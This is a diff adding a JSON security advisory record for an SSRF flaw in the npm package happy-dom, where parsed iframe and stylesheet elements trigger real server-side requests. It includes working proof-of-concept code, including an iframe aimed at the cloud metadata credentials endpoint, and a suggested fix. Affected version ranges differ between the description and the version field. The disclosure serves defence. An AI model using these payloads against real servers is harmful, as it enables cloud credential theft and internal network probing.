@@ -1,0 +1,59 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-10-28T21:06:43Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "happy-dom"
+  },
+  "Advisory": {
+    "DatabaseId": 523739,
+    "Id": "GSA_kwCzR0hTQS1jOHA0LWo5N2gtM3ZnOM4AB_3b",
+    "GhsaId": "GHSA-c8p4-j97h-3vg8",
+    "References": [
+      {
+        "Url": "https://github.com/capricorn86/happy-dom/security/advisories/GHSA-c8p4-j97h-3vg8"
+      },
+      {
+        "Url": "https://github.com/capricorn86/happy-dom/pull/2502"
+      },
+      {
+        "Url": "https://github.com/capricorn86/happy-dom/commit/0a99c7525a1d0043e3182843ae33466ab7b19e74"
+      },
+      {
+        "Url": "https://github.com/capricorn86/happy-dom/releases/tag/v21.0.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-c8p4-j97h-3vg8"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-c8p4-j97h-3vg8"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-118660"
+      }
+    ],
+    "Description": "## Summary\nhappy-dom v20.8.9 makes real server-side HTTP requests to arbitrary URLs when parsing HTML containing `\u003ciframe\u003e` or `\u003clink rel=\"stylesheet\"\u003e` elements. This behavior is enabled by default (`disableIframePageLoading: false`, `disableCSSFileLoading: false`). When an application uses happy-dom to parse untrusted HTML on the server side, an attacker can trigger Server-Side Request Forgery by embedding these elements.\n\n## Affected Versions\n- happy-dom \u003c= 20.8.9 (latest)\n\n## Vulnerable Behavior\n\nBy default, happy-dom has:\n- `disableIframePageLoading: false` — iframes fetch their `src` URL via real HTTP requests\n- `disableCSSFileLoading: false` — `\u003clink\u003e` stylesheets fetch their `href` URL via real HTTP requests\n\nWhen untrusted HTML is parsed, these elements trigger real server-side HTTP requests to whatever URLs are specified. No special configuration or opt-in is needed.\n\n## Proof of Concept\n\n### Verified test (attacker server receives requests):\n```javascript\nconst http = require('http');\nconst { Window } = require('happy-dom');\n\n// Start attacker server\nconst srv = http.createServer((req, res) =\u003e {\n    console.log(`SSRF HIT: ${req.method} ${req.url}`);\n    res.writeHead(200, {'Content-Type': 'text/html'});\n    res.end('\u003chtml\u003e\u003cbody\u003estolen\u003c/body\u003e\u003c/html\u003e');\n});\n\nsrv.listen(9995, () =\u003e {\n    // iframe SSRF — happy-dom makes a real GET request\n    const win1 = new Window({ url: 'http://localhost' });\n    win1.document.write('\u003chtml\u003e\u003cbody\u003e\u003ciframe src=\"http://127.0.0.1:9995/iframe-ssrf\"\u003e\u003c/iframe\u003e\u003c/body\u003e\u003c/html\u003e');\n\n    // stylesheet SSRF — happy-dom makes a real GET request\n    const win2 = new Window({ url: 'http://localhost' });\n    win2.document.write('\u003chtml\u003e\u003chead\u003e\u003clink rel=\"stylesheet\" href=\"http://127.0.0.1:9995/stylesheet-ssrf\"\u003e\u003c/head\u003e\u003cbody\u003e\u003c/body\u003e\u003c/html\u003e');\n});\n```\n\n**Test output:**\n```\nSSRF HIT: GET /iframe-ssrf\nSSRF HIT: GET /stylesheet-ssrf\n```\n\nBoth requests confirmed received by the attacker server. Tested on happy-dom v20.8.9, Node.js v22.17.0, macOS.\n\n### Cloud metadata attack scenario:\n```javascript\nconst { Window } = require('happy-dom');\nconst win = new Window({ url: 'http://localhost' });\n\n// Attacker-controlled HTML triggers fetch to AWS metadata endpoint\nwin.document.write('\u003chtml\u003e\u003cbody\u003e\u003ciframe src=\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\u003e\u003c/iframe\u003e\u003c/body\u003e\u003c/html\u003e');\n```\n\n## Impact\n- **Cloud credential theft** — `\u003ciframe src=\"http://169.254.169.254/...\"\u003e` fetches AWS/GCP/Azure metadata\n- **Internal network scanning** — probe internal services and ports\n- **Data exfiltration** — read responses from internal APIs\n- **Affects any server-side use case** — web scraping, email HTML rendering, SSR, testing with external HTML input\n\n## Suggested Fix\nChange defaults to disable external resource loading:\n```javascript\ndisableIframePageLoading: true,  // change from false\ndisableCSSFileLoading: true,     // change from false\n```\n\nOr add URL validation to block private IP ranges and cloud metadata endpoints before fetching.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-28T21:06:42Z",
+    "Severity": "HIGH",
+    "Summary": "Happy DOM: SSRF via iframe and link stylesheet when parsing untrusted HTML",
+    "UpdatedAt": "2026-10-28T21:06:43Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.6,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "21.0.0"
+      },
+      "VulnerableVersionRange": "\u003c= 20.14.6"
+    }
+  ]
+}
